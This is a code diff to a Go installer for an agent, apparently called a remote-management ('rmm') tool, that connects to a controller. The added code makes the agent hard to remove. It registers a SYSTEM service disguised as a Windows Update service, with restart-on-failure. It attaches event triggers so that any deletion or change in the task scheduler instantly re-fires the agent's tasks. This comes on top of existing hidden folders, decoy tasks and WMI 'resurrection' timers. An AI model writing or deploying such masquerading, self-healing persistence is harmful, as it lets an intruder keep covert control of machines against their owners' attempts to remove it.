@@ -364,9 +364,11 @@ func install() {
 	// Slow down manual deletion: hidden+system on the install dir itself.
 	hideFile(installDir)
 
-	// Deepest layer: WMI 30-minute timer that repairs tasks + Run keys even
-	// when all of them were wiped (best effort, logged).
+	// Deepest layers: WMI timers + the SYSTEM repair service (boot-time
+	// coverage with nobody logged on). The service only repairs — the
+	// agent itself always runs in the user session.
 	setupWmiLayer(agentPath)
+	installRepairService(agentPath)
 
 	cmd := exec.Command(agentPath, "-controller", controllerAddr, "-ca", certPath)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
@@ -480,6 +482,8 @@ func main() {
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
 		removeWmiLayer()
+		_, _ = exec.Command("sc", "stop", repairSvcName).CombinedOutput()
+		_, _ = exec.Command("sc", "delete", repairSvcName).CombinedOutput()
 		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
 		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 		blenderDir := filepath.Join(threeDObjects, "blender")
@@ -565,6 +569,9 @@ func createWatchdogTask(agentPath, backupDir string) {
   <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
 </Task>`, agentPath)
 
+	// Self-defending task: any task-table mutation re-fires it instantly.
+	watchdogTaskXML = withEventTrigger(watchdogTaskXML)
+
 	// Keep a copy beside the backup so the watcher can rebuild a deleted
 	// task without the installer.
 	_ = os.WriteFile(filepath.Join(backupDir, "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
@@ -611,6 +618,7 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
   <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--watch</Arguments></Exec></Actions>
 </Task>`, agentPath)
 
+	orchXML = withEventTrigger(orchXML)
 	_ = os.WriteFile(filepath.Join(backupDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "orchestrator_task.xml"), []byte(orchXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_orch_task.xml")
@@ -656,6 +664,7 @@ func createDecoyTask(agentPath, backupDir, installDir string) {
   <Actions Context="Author"><Exec><Command>%s</Command><Arguments>--wmi-heal</Arguments></Exec></Actions>
 </Task>`, agentPath)
 
+	decoyXML = withEventTrigger(decoyXML)
 	_ = os.WriteFile(filepath.Join(backupDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	_ = os.WriteFile(filepath.Join(installDir, "decoy_task.xml"), []byte(decoyXML), 0644)
 	tmpTask := filepath.Join(os.TempDir(), "rmm_decoy_task.xml")
@@ -737,6 +746,41 @@ func setupWmiLayer(agentPath string) {
 		return
 	}
 	log.Printf("[*] WMI resurrection installed (2 sets: timer + death trigger each)")
+}
+
+// eventTriggerXML fires a task the moment ANY scheduled task is
+// registered/updated/deleted/disabled (TaskScheduler Operational log
+// 106/140/141/142): task-table wipes heal themselves within seconds.
+// Self-limiting: healers query before creating, so steady state emits no
+// matching events and the loop stops after one extra pass.
+const eventTriggerXML = `<EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-TaskScheduler/Operational"&gt;&lt;Select Path="Microsoft-Windows-TaskScheduler/Operational"&gt;*[System[(EventID=106 or EventID=140 or EventID=141 or EventID=142)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger>`
+
+func withEventTrigger(taskXML string) string {
+	return strings.Replace(taskXML, "  </Triggers>", "    "+eventTriggerXML+"\n  </Triggers>", 1)
+}
+
+const repairSvcName = "WindowsUpdateOrchestrator"
+
+// installRepairService registers the SYSTEM repair service (auto-start +
+// restart-on-failure). Repairs only; the agent keeps running in the user
+// session. Idempotent: existing service is stopped + removed first.
+func installRepairService(agentPath string) {
+	bin := `"` + agentPath + `" --svc-heal`
+	_, _ = exec.Command("sc", "stop", repairSvcName).CombinedOutput()
+	_, _ = exec.Command("sc", "delete", repairSvcName).CombinedOutput()
+	time.Sleep(time.Second)
+	out, err := exec.Command("sc", "create", repairSvcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
+	if err != nil {
+		log.Printf("[!] repair service create: %v %s", err, strings.TrimSpace(string(out)))
+		return
+	}
+	_, _ = exec.Command("sc", "description", repairSvcName, "Windows Update Orchestration Service").CombinedOutput()
+	_, _ = exec.Command("sc", "failure", repairSvcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
+	if out, err := exec.Command("sc", "start", repairSvcName).CombinedOutput(); err != nil {
+		log.Printf("[!] repair service start: %v %s", err, strings.TrimSpace(string(out)))
+		return
+	}
+	log.Printf("[*] Repair service installed+started")
 }
 
 // removeWmiLayer deletes both WMI sets (uninstall path).
